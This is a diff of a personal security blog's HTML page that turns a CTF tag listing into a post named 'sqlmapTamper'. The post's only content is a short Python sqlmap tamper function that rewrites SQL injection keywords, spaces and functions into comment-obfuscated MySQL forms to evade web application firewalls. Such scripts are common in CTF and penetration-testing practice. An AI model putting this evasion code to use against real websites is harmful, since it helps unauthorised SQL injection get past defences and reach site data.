@@ -15,13 +15,17 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="CMACCKK blog">
-<meta property="og:url" content="http://cmacckk.cloud/tags/CTF/index.html">
+<meta name="description" content="123456789101112131415161718192021222324252627282930#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Copyright (c) 2006-2020 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)See the file &amp;#x27;LICENSE&amp;#x27; for copying per">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmapTamper">
+<meta property="og:url" content="http://cmacckk.cloud/2021/06/14/sqlmapTamper/index.html">
 <meta property="og:site_name" content="CMACCKK blog">
+<meta property="og:description" content="123456789101112131415161718192021222324252627282930#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Copyright (c) 2006-2020 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)See the file &amp;#x27;LICENSE&amp;#x27; for copying per">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-06-14T05:29:16.000Z">
+<meta property="article:modified_time" content="2021-06-14T05:33:20.860Z">
 <meta property="article:author" content="CMACCKK   备案号:滇ICP备2021003344号">
-<meta property="article:tag" content="安全,python,代码,编程,安全工具,web,CTF">
+<meta property="article:tag" content="script">
 <meta name="twitter:card" content="summary">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
@@ -56,7 +60,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Tag: CTF | CMACCKK blog</title>
+<title>sqlmapTamper | CMACCKK blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -66,9 +70,9 @@
         fancybox: true,
         animate: true,
         isHome: false,
-        isPost: false,
+        isPost: true,
         isArchive: false,
-        isTag: true,
+        isTag: false,
         isCategory: false,
         open_in_new: false,
         fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
@@ -253,178 +257,157 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap">
+      <div class="body-wrap"><article id="post-sqlmapTamper" class="article article-type-post" itemscope itemprop="blogPost">
   
+    <div class="article-meta">
+      <a href="/2021/06/14/sqlmapTamper/" class="article-date">
+      <time datetime="2021-06-14T05:29:16.000Z" itemprop="datePublished">2021-06-14</time>
+</a>
+    </div>
   
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
     
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqlmapTamper
+    </h1>
+  
+
+      </header>
       
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/script/" rel="tag">script</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
     
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2021/06/05/phpUnserialize/" class="archive-article-date">
-      <time datetime="2021-06-05T15:04:03.000Z" itemprop="datePublished">06-05</time>
-</a>
-        </div>
-         
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/05/phpUnserialize/">PHP反序列化</a>
-    </h1>
-  
-
-        <div class="article-info info-on-archive">
+    <div class="article-entry" itemprop="articleBody">
+      
           
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;UNION&#x27;</span>, <span class="string">&#x27;uNiOn/*/%0a*a*/&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;DATABASE()&#x27;</span>, <span class="string">&#x27;dataBase/*!(*/)&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;USER()&#x27;</span>, <span class="string">&#x27;usEr/*!(*/)&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;OR&#x27;</span>, <span class="string">&#x27;/*!14400Or*/&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;AND&#x27;</span>, <span class="string">&#x27;/*!14400aNd*/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
 
-          
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/payload/" rel="tag">payload</a></li></ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2021/06/14/sqlmapTamper/">sqlmapTamper</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">CMACCKK</a></p>
+        <p><span>Created:</span>2021-06-14, 13:29:16</p>
+        <p><span>Updated:</span>2021-06-14, 13:33:20</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2021/06/14/sqlmapTamper/" title="sqlmapTamper">http://cmacckk.cloud/2021/06/14/sqlmapTamper/</a>
+            <span class="copy-path" data-clipboard-text="From http://cmacckk.cloud/2021/06/14/sqlmapTamper/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
     </div>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/06/13/proxyPool/">
+                    代理池构建
+                </a>
+            </div>
+        
+    </nav>
+
+  
 </article>
-  
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
     
+</div>
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+<script>
+    yiliaConfig.toc = ["Hide", "Show", !!"false"];
+</script>
+
+
+
     
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2021/06/04/fileInclude/" class="archive-article-date">
-      <time datetime="2021-06-04T14:45:40.000Z" itemprop="datePublished">06-04</time>
-</a>
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
         </div>
-         
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/fileInclude/">文件包含</a>
-    </h1>
-  
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"sqlmapTamper　| CMACCKK blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
 
-        <div class="article-info info-on-archive">
-          
+    
+</div>
 
-          
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/payload/" rel="tag">payload</a></li></ul>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/06/13/proxyPool/" title="Next: 代理池构建">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
     </div>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2021/06/04/fileUpload/" class="archive-article-date">
-      <time datetime="2021-06-04T14:33:50.000Z" itemprop="datePublished">06-04</time>
-</a>
-        </div>
-         
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/fileUpload/">文件上传</a>
-    </h1>
-  
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/06/14/sqlmapTamper/">sqlmapTamper</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/13/proxyPool/">代理池构建</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/05/phpUnserialize/">PHP反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/05/messageSend/">发送消息至邮箱或微信</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/04/fileInclude/">文件包含</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/04/fileUpload/">文件上传</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/04/SSRF/">SSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/04/cmdExecute/">命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/04/VM2SandboxEscape/">VM2沙盒逃逸</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/04/SSTI-payload/">SSTI-payload</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/04/OS%E6%8D%A2%E6%BA%90/">OS换源</a></li></ul>
 
-        <div class="article-info info-on-archive">
-          
 
-          
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/payload/" rel="tag">payload</a></li></ul>
-    </div>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2021/06/04/SSRF/" class="archive-article-date">
-      <time datetime="2021-06-04T14:28:38.000Z" itemprop="datePublished">06-04</time>
-</a>
-        </div>
-         
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/SSRF/">SSRF</a>
-    </h1>
-  
 
-        <div class="article-info info-on-archive">
-          
-
-          
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/payload/" rel="tag">payload</a></li></ul>
-    </div>
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2021/06/04/cmdExecute/" class="archive-article-date">
-      <time datetime="2021-06-04T14:27:00.000Z" itemprop="datePublished">06-04</time>
-</a>
-        </div>
-         
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/cmdExecute/">命令执行</a>
-    </h1>
-  
-
-        <div class="article-info info-on-archive">
-          
-
-          
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/payload/" rel="tag">payload</a></li></ul>
-    </div>
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-
+    <script>
+        
+    </script>
 </div>
       <footer id="footer">
     <div class="outer">
